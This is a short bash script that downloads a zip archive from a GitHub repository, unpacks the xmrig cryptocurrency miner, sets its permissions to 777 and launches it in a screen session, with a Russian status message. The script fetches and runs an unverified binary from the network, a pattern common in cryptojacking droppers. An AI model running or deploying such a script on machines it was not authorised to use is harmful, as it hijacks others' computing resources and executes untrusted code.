#!/bin/bash


apt-get update

apt install unzip


mkdir s_mine


cd s_mine


wget https://github.com/Hentai624/1/raw/master/m.zip


unzip m

echo -en "\033[1;31m Выдача прав \033[0;39m"

chmod 777 xmrig


screen

./xmrig
